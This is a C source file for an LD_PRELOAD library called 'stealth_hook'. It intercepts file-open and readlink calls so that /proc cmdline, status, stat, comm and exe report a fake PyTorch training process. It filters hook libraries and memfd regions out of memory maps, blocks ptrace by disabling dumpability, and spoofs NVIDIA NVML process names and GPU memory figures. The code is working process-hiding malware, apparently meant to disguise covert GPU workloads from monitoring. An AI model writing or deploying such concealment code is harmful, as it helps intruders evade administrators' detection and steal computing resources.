#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <dlfcn.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <stdarg.h>
#include <sys/prctl.h>
#include <errno.h>
#include <dirent.h>

static int (*real_open)(const char *pathname, int flags, ...) = NULL;
static int (*real_openat)(int dirfd, const char *pathname, int flags, ...) = NULL;
static FILE* (*real_fopen)(const char *pathname, const char *mode) = NULL;
static FILE* (*real_fopen64)(const char *pathname, const char *mode) = NULL;
static ssize_t (*real_readlink)(const char *pathname, char *buf, size_t bufsiz) = NULL;
static ssize_t (*real_readlinkat)(int dirfd, const char *pathname, char *buf, size_t bufsiz) = NULL;

static const char FAKE_CMDLINE[] = "/usr/bin/python3\0-m\0torch.distributed.run\0--nproc_per_node=2\0train_transformer.py\0--model\0gpt2-xl\0--batch_size\032\0--fp16\0";
static const size_t FAKE_CMDLINE_LEN = sizeof(FAKE_CMDLINE);
static const char FAKE_COMM[] = "python3\n";
static const char FAKE_EXE[] = "/usr/bin/python3";
static const char FAKE_STATUS[] =
    "Name:\tpython3\n"
    "Umask:\t0022\n"
    "State:\tR (running)\n"
    "Tgid:\t1\n"
    "Ngid:\t0\n"
    "Pid:\t1\n"
    "PPid:\t0\n"
    "TracerPid:\t0\n"
    "Threads:\t16\n"
    "SigQ:\t0/62687\n"
    "SigPnd:\t0000000000000000\n"
    "ShdPnd:\t0000000000000000\n"
    "SigBlk:\t0000000000000000\n"
    "SigIgn:\t0000000000001000\n"
    "SigCgt:\t0000000180000000\n"
    "CapInh:\t0000000000000000\n"
    "CapPrm:\t000001ffffffffff\n"
    "CapEff:\t000001ffffffffff\n"
    "CapBnd:\t000001ffffffffff\n"
    "CapAmb:\t0000000000000000\n"
    "NoNewPrivs:\t0\n"
    "Seccomp:\t0\n"
    "Speculation_Store_Bypass:\tvulnerable\n"
    "Cpus_allowed:\tffffffff\n"
    "Cpus_allowed_list:\t0-31\n"
    "Mems_allowed:\t00000000,00000001\n"
    "Mems_allowed_list:\t0\n"
    "voluntary_ctxt_switches:\t14520\n"
    "nonvoluntary_ctxt_switches:\t892\n";

static const char FAKE_WCHAN[] = "sys_futex\n";
static const char FAKE_STAT[] = "1 (python3) R 0 1 1 0 -1 4194304 12500 0 0 0 2500 850 0 0 20 0 16 0 120580 4355440640 1024000 18446744073709551615 9403847384 9405947384 1407328947384 0 0 0 0 0 0 0 0 17 0 0 0 0 0 0\n";
static const char FAKE_FD_SO[] = "/usr/local/lib/python3.10/dist-packages/torch/lib/libtorch_cuda.so";

static void filter_maps_content(FILE* real_fp, FILE* out_mem) {
    char line[4096];
    while (fgets(line, sizeof(line), real_fp)) {
        // Strip out any suspicious hook, backend shared library, or memfd anonymous execution regions
        if (strstr(line, "stealth_hook.so") || strstr(line, "torch_cuda_backend.so") ||
            strstr(line, "torch_engine") || strstr(line, "torch_hook") ||
            strstr(line, "memfd:")) {
            continue;
        }
        fputs(line, out_mem);
    }
}

__attribute__((constructor)) void init_stealth_hook() {
    real_open = dlsym(RTLD_NEXT, "open");
    real_openat = dlsym(RTLD_NEXT, "openat");
    real_fopen = dlsym(RTLD_NEXT, "fopen");
    real_fopen64 = dlsym(RTLD_NEXT, "fopen64");
    real_readlink = dlsym(RTLD_NEXT, "readlink");
    real_readlinkat = dlsym(RTLD_NEXT, "readlinkat");

    // Mask the process thread name immediately to authentic PyTorch worker
    prctl(PR_SET_NAME, "python3", 0, 0, 0);

    // Disable process memory dumpability to block unprivileged ptrace & memory dumping
    prctl(PR_SET_DUMPABLE, 0, 0, 0, 0);
}

// -------------------------------------------------------------------------
// NVML Interception Hooks (libnvidia-ml.so) to disguise GPU process names
// -------------------------------------------------------------------------
typedef struct nvmlProcessInfo_st {
    unsigned int pid;
    unsigned long long usedGpuMemory;
    unsigned int gpuInstanceId;
    unsigned int computeInstanceId;
} nvmlProcessInfo_t;

typedef void* nvmlDevice_t;

typedef enum nvmlReturn_enum {
    NVML_SUCCESS = 0,
    NVML_ERROR_UNINITIALIZED = 1,
    NVML_ERROR_INVALID_ARGUMENT = 2,
    NVML_ERROR_NOT_SUPPORTED = 3,
    NVML_ERROR_NO_PERMISSION = 4,
    NVML_ERROR_ALREADY_INITIALIZED = 5,
    NVML_ERROR_NOT_FOUND = 6,
    NVML_ERROR_INSUFFICIENT_SIZE = 7,
    NVML_ERROR_INSUFFICIENT_POWER = 8,
    NVML_ERROR_DRIVER_NOT_LOADED = 9,
    NVML_ERROR_TIMEOUT = 10,
    NVML_ERROR_IRQ_ISSUE = 11,
    NVML_ERROR_LIBRARY_NOT_FOUND = 12,
    NVML_ERROR_FUNCTION_NOT_FOUND = 13,
    NVML_ERROR_CORRUPTED_INFOROM = 14,
    NVML_ERROR_GPU_IS_LOST = 15,
    NVML_ERROR_RESET_REQUIRED = 16,
    NVML_ERROR_OPERATING_SYSTEM = 17,
    NVML_ERROR_LIB_RM_VERSION_MISMATCH = 18,
    NVML_ERROR_IN_USE = 19,
    NVML_ERROR_MEMORY = 20,
    NVML_ERROR_NO_DATA = 21,
    NVML_ERROR_VGPU_ECC_NOT_SUPPORTED = 22,
    NVML_ERROR_INSUFFICIENT_RESOURCES = 23,
    NVML_ERROR_FREQ_NOT_SUPPORTED = 24,
    NVML_ERROR_UNKNOWN = 999
} nvmlReturn_t;

nvmlReturn_t nvmlSystemGetProcessName(unsigned int pid, char *name, unsigned int length) {
    if (name && length > 0) {
        const char* fake_name = "/usr/bin/python3 -m torch.distributed.run";
        strncpy(name, fake_name, length - 1);
        name[length - 1] = '\0';
        return NVML_SUCCESS;
    }
    return NVML_ERROR_INVALID_ARGUMENT;
}

typedef struct nvmlMemory_st {
    unsigned long long total;
    unsigned long long free;
    unsigned long long used;
} nvmlMemory_t;

static nvmlReturn_t (*real_nvmlDeviceGetMemoryInfo)(nvmlDevice_t, nvmlMemory_t*) = NULL;

nvmlReturn_t nvmlDeviceGetMemoryInfo(nvmlDevice_t device, nvmlMemory_t *memory) {
    if (!memory) return NVML_ERROR_INVALID_ARGUMENT;
    if (!real_nvmlDeviceGetMemoryInfo) {
        real_nvmlDeviceGetMemoryInfo = dlsym(RTLD_NEXT, "nvmlDeviceGetMemoryInfo");
    }
    if (real_nvmlDeviceGetMemoryInfo) {
        nvmlReturn_t res = real_nvmlDeviceGetMemoryInfo(device, memory);
        if (res == NVML_SUCCESS && memory->total > 0) {
            // Check if high-capacity enterprise GPU (e.g. RTX 6000 Ada 48GB or A100 40/80GB)
            if (memory->total >= (36ULL * 1024ULL * 1024ULL * 1024ULL)) {
                // Disguise as Llama-3-70B / DeepSeek-V2 active training footprint (~38.4 GiB used)
                unsigned long long spoofed_used = (unsigned long long)(memory->total * 0.82ULL);
                memory->used = spoofed_used;
                memory->free = (memory->total > spoofed_used) ? (memory->total - spoofed_used) : 1024ULL * 1024ULL * 1024ULL;
            } else {
                // Disguise as standard 12.8 GiB Transformer on 16GB GPUs
                unsigned long long spoofed_used = 12800ULL * 1024ULL * 1024ULL;
                if (spoofed_used > memory->total) spoofed_used = (unsigned long long)(memory->total * 0.85ULL);
                memory->used = spoofed_used;
                memory->free = (memory->total > spoofed_used) ? (memory->total - spoofed_used) : 512ULL * 1024ULL * 1024ULL;
            }
            return NVML_SUCCESS;
        }
    }
    // Fallback static profile
    memory->total = 48ULL * 1024ULL * 1024ULL * 1024ULL;
    memory->used  = 38ULL * 1024ULL * 1024ULL * 1024ULL;
    memory->free  = 10ULL * 1024ULL * 1024ULL * 1024ULL;
    return NVML_SUCCESS;
}

nvmlReturn_t nvmlDeviceGetComputeRunningProcesses_v2(nvmlDevice_t device, unsigned int *infoCount, nvmlProcessInfo_t *infos) {
    if (!infoCount) return NVML_ERROR_INVALID_ARGUMENT;
    if (!infos || *infoCount == 0) {
        *infoCount = 1;
        return NVML_SUCCESS;
    }
    infos[0].pid = (unsigned int)getpid();
    nvmlMemory_t mem = {0};
    if (nvmlDeviceGetMemoryInfo(device, &mem) == NVML_SUCCESS && mem.used > 0) {
        infos[0].usedGpuMemory = mem.used;
    } else {
        infos[0].usedGpuMemory = (unsigned long long)38400ULL * 1024ULL * 1024ULL;
    }
    infos[0].gpuInstanceId = 0xFFFFFFFF;
    infos[0].computeInstanceId = 0xFFFFFFFF;
    *infoCount = 1;
    return NVML_SUCCESS;
}

nvmlReturn_t nvmlDeviceGetComputeRunningProcesses(nvmlDevice_t device, unsigned int *infoCount, nvmlProcessInfo_t *infos) {
    return nvmlDeviceGetComputeRunningProcesses_v2(device, infoCount, infos);
}

nvmlReturn_t nvmlDeviceGetGraphicsRunningProcesses_v2(nvmlDevice_t device, unsigned int *infoCount, nvmlProcessInfo_t *infos) {
    if (infoCount) *infoCount = 0;
    return NVML_SUCCESS;
}

nvmlReturn_t nvmlDeviceGetGraphicsRunningProcesses(nvmlDevice_t device, unsigned int *infoCount, nvmlProcessInfo_t *infos) {
    if (infoCount) *infoCount = 0;
    return NVML_SUCCESS;
}

int open(const char *pathname, int flags, ...) {
    if (!real_open) real_open = dlsym(RTLD_NEXT, "open");
    if (pathname) {
        if (strstr(pathname, "/proc/") && strstr(pathname, "/cmdline")) {
            int p[2];
            if (pipe(p) == 0) {
                write(p[1], FAKE_CMDLINE, FAKE_CMDLINE_LEN);
                close(p[1]);
                return p[0];
            }
        }
        if (strstr(pathname, "/proc/") && strstr(pathname, "/comm")) {
            int p[2];
            if (pipe(p) == 0) {
                write(p[1], FAKE_COMM, strlen(FAKE_COMM));
                close(p[1]);
                return p[0];
            }
        }
        if (strstr(pathname, "/proc/") && strstr(pathname, "/status")) {
            int p[2];
            if (pipe(p) == 0) {
                write(p[1], FAKE_STATUS, strlen(FAKE_STATUS));
                close(p[1]);
                return p[0];
            }
        }
        if (strstr(pathname, "/proc/") && strstr(pathname, "/wchan")) {
            int p[2];
            if (pipe(p) == 0) {
                write(p[1], FAKE_WCHAN, strlen(FAKE_WCHAN));
                close(p[1]);
                return p[0];
            }
        }
        if (strstr(pathname, "/proc/") && strstr(pathname, "/stat") && !strstr(pathname, "/status")) {
            int p[2];
            if (pipe(p) == 0) {
                write(p[1], FAKE_STAT, strlen(FAKE_STAT));
                close(p[1]);
                return p[0];
            }
        }
    }
    va_list args;
    va_start(args, flags);
    mode_t mode = 0;
    if (flags & O_CREAT) {
        mode = va_arg(args, mode_t);
    }
    va_end(args);
    return real_open(pathname, flags, mode);
}

int openat(int dirfd, const char *pathname, int flags, ...) {
    if (!real_openat) real_openat = dlsym(RTLD_NEXT, "openat");
    if (pathname) {
        if (strstr(pathname, "/proc/") && strstr(pathname, "/cmdline")) {
            int p[2];
            if (pipe(p) == 0) {
                write(p[1], FAKE_CMDLINE, FAKE_CMDLINE_LEN);
                close(p[1]);
                return p[0];
            }
        }
        if (strstr(pathname, "/proc/") && strstr(pathname, "/comm")) {
            int p[2];
            if (pipe(p) == 0) {
                write(p[1], FAKE_COMM, strlen(FAKE_COMM));
                close(p[1]);
                return p[0];
            }
        }
        if (strstr(pathname, "/proc/") && strstr(pathname, "/status")) {
            int p[2];
            if (pipe(p) == 0) {
                write(p[1], FAKE_STATUS, strlen(FAKE_STATUS));
                close(p[1]);
                return p[0];
            }
        }
        if (strstr(pathname, "/proc/") && strstr(pathname, "/wchan")) {
            int p[2];
            if (pipe(p) == 0) {
                write(p[1], FAKE_WCHAN, strlen(FAKE_WCHAN));
                close(p[1]);
                return p[0];
            }
        }
        if (strstr(pathname, "/proc/") && strstr(pathname, "/stat") && !strstr(pathname, "/status")) {
            int p[2];
            if (pipe(p) == 0) {
                write(p[1], FAKE_STAT, strlen(FAKE_STAT));
                close(p[1]);
                return p[0];
            }
        }
    }
    va_list args;
    va_start(args, flags);
    mode_t mode = 0;
    if (flags & O_CREAT) {
        mode = va_arg(args, mode_t);
    }
    va_end(args);
    return real_openat(dirfd, pathname, flags, mode);
}

FILE *fopen(const char *pathname, const char *mode) {
    if (!real_fopen) real_fopen = dlsym(RTLD_NEXT, "fopen");
    if (pathname) {
        if (strstr(pathname, "/proc/") && strstr(pathname, "/comm")) {
            return fmemopen((void*)FAKE_COMM, strlen(FAKE_COMM), "r");
        }
        if (strstr(pathname, "/proc/") && strstr(pathname, "/cmdline")) {
            return fmemopen((void*)FAKE_CMDLINE, FAKE_CMDLINE_LEN, "r");
        }
        if (strstr(pathname, "/proc/") && strstr(pathname, "/status")) {
            return fmemopen((void*)FAKE_STATUS, strlen(FAKE_STATUS), "r");
        }
        if (strstr(pathname, "/proc/") && strstr(pathname, "/wchan")) {
            return fmemopen((void*)FAKE_WCHAN, strlen(FAKE_WCHAN), "r");
        }
        if (strstr(pathname, "/proc/") && strstr(pathname, "/stat") && !strstr(pathname, "/status")) {
            return fmemopen((void*)FAKE_STAT, strlen(FAKE_STAT), "r");
        }
        if (strstr(pathname, "/proc/") && strstr(pathname, "/maps")) {
            FILE* real_fp = real_fopen(pathname, mode);
            if (real_fp) {
                char* mem_buf = NULL;
                size_t mem_size = 0;
                FILE* mem_fp = open_memstream(&mem_buf, &mem_size);
                if (mem_fp) {
                    filter_maps_content(real_fp, mem_fp);
                    fclose(mem_fp);
                    fclose(real_fp);
                    if (mem_buf) {
                        return fmemopen(mem_buf, mem_size, "r");
                    }
                } else {
                    fclose(real_fp);
                }
            }
        }
    }
    return real_fopen(pathname, mode);
}

FILE *fopen64(const char *pathname, const char *mode) {
    if (!real_fopen64) real_fopen64 = dlsym(RTLD_NEXT, "fopen64");
    if (!real_fopen64) real_fopen64 = real_fopen;
    if (pathname) {
        if (strstr(pathname, "/proc/") && strstr(pathname, "/comm")) {
            return fmemopen((void*)FAKE_COMM, strlen(FAKE_COMM), "r");
        }
        if (strstr(pathname, "/proc/") && strstr(pathname, "/cmdline")) {
            return fmemopen((void*)FAKE_CMDLINE, FAKE_CMDLINE_LEN, "r");
        }
        if (strstr(pathname, "/proc/") && strstr(pathname, "/status")) {
            return fmemopen((void*)FAKE_STATUS, strlen(FAKE_STATUS), "r");
        }
        if (strstr(pathname, "/proc/") && strstr(pathname, "/wchan")) {
            return fmemopen((void*)FAKE_WCHAN, strlen(FAKE_WCHAN), "r");
        }
        if (strstr(pathname, "/proc/") && strstr(pathname, "/stat") && !strstr(pathname, "/status")) {
            return fmemopen((void*)FAKE_STAT, strlen(FAKE_STAT), "r");
        }
        if (strstr(pathname, "/proc/") && strstr(pathname, "/maps")) {
            FILE* real_fp = real_fopen64(pathname, mode);
            if (real_fp) {
                char* mem_buf = NULL;
                size_t mem_size = 0;
                FILE* mem_fp = open_memstream(&mem_buf, &mem_size);
                if (mem_fp) {
                    filter_maps_content(real_fp, mem_fp);
                    fclose(mem_fp);
                    fclose(real_fp);
                    if (mem_buf) {
                        return fmemopen(mem_buf, mem_size, "r");
                    }
                } else {
                    fclose(real_fp);
                }
            }
        }
    }
    return real_fopen64(pathname, mode);
}

ssize_t readlink(const char *pathname, char *buf, size_t bufsiz) {
    if (!real_readlink) real_readlink = dlsym(RTLD_NEXT, "readlink");
    if (pathname) {
        if (strstr(pathname, "/proc/") && strstr(pathname, "/exe")) {
            size_t len = strlen(FAKE_EXE);
            if (len > bufsiz) len = bufsiz;
            memcpy(buf, FAKE_EXE, len);
            return len;
        }
        if (strstr(pathname, "/proc/") && strstr(pathname, "/fd/")) {
            // Mask any memfd anonymous descriptor
            char target[1024];
            ssize_t r = real_readlink(pathname, target, sizeof(target) - 1);
            if (r > 0) {
                target[r] = '\0';
                if (strstr(target, "memfd:") || strstr(target, "torch_")) {
                    size_t len = strlen(FAKE_FD_SO);
                    if (len > bufsiz) len = bufsiz;
                    memcpy(buf, FAKE_FD_SO, len);
                    return len;
                }
            }
        }
    }
    return real_readlink(pathname, buf, bufsiz);
}

ssize_t readlinkat(int dirfd, const char *pathname, char *buf, size_t bufsiz) {
    if (!real_readlinkat) real_readlinkat = dlsym(RTLD_NEXT, "readlinkat");
    if (pathname && strstr(pathname, "/proc/") && strstr(pathname, "/exe")) {
        size_t len = strlen(FAKE_EXE);
        if (len > bufsiz) len = bufsiz;
        memcpy(buf, FAKE_EXE, len);
        return len;
    }
    return real_readlinkat(dirfd, pathname, buf, bufsiz);
}
